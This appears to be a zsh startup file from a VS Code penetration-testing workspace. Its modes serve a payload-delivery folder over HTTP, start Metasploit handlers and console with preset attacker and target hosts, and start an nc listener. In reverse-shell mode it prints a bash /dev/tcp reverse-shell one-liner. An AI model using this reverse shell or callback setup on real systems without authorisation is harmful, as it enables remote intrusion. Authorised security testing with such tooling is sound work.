# POST executed after the shell is loaded
# This file is loaded after .zshrc

# This file can be empty of deleted if not needed
# Loading Order
# vscode ==(inject PROJECT_FOLDER and check settings.json)==> source.zsh (PreHandling)
# source.zsh ==(source env.zsh)==> env.zsh
# source.zsh ==(Check Mode)==> Do any IF condition or keep continue
# source.zsh ==(exec zsh -i)==> ~/.zshrc
# ~/.zshrc ==(contains weapon_vscode_launch_helper function)==> launch_helper.zsh
# ~/.zshrc ==(if set, PROJECT_FOLDER and .vscode/.zshrc exists, source it)==> .vscode/.zshrc

# you can define any function 

source ${PROJECT_FOLDER}/.vscode/env.zsh

if [ "$WEB_DELIVERY_MODE" ]; then
    if [ -z "$PROJECT_WEB_DELIVERY" ]; then
        echo "PROJECT_WEB_DELIVERY is not set. Please set it in .vscode/env.zsh"
    else 
        if [ -d "$PROJECT_WEB_DELIVERY" ]; then
            echo "FOLDER $PROJECT_WEB_DELIVERY exists."
        else
            mkdir -p $PROJECT_WEB_DELIVERY
            echo "*" > $PROJECT_WEB_DELIVERY/.gitignore
            echo "FOLDER $PROJECT_WEB_DELIVERY created."
        fi
    fi
    cd $PROJECT_WEB_DELIVERY
    export LISTEN_ON=8890
    echo ""
    echo "YOUR IP: $LHOST "
    echo "YOUR URL: http://$LHOST:$LISTEN_ON "
    echo ""
    python3 -m http.server $LISTEN_ON
    exit 0
fi 


export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg RHOSTS $RHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LHOST $LHOST;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg LPORT $LPORT;"
export METASPLOIT_INIT_COMMAND="${METASPLOIT_INIT_COMMAND} setg VHOST $DOMAIN;"


if [ "$METASPLOIT_HANDLER_MODE" ]; then
    msfconsole -r "$PROJECT_FOLDER/.vscode/metasploit_handler.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    exit 0
fi

if [ "$METASPLOIT_CONSOLE_MODE" ]; then 
    msfconsole -r "$PROJECT_FOLDER/.vscode/msfconsole.rc" \
        -x "${METASPLOIT_INIT_COMMAND}"
    exit 0
fi

if [ "$REVERSE_SHELL_MODE" ]; then
    echo ""
    echo "YOUR IP: $LHOST"
    echo "YOUR Reverse Shell Port: $LPORT"
    echo "Basic Revershell Command: "
    echo "  /bin/bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1"
    echo "Advanced: "
    echo "  https://rev.eson.ninja/?ip=${LHOST}&port=${LPORT}"
    echo ""
    rlwrap -I -cAr nc -lvvp ${LPORT}
    exit 0
fi

if [ -d "$PROJECT_FOLDER/venv" ]; then
    source $PROJECT_FOLDER/venv/bin/activate
fi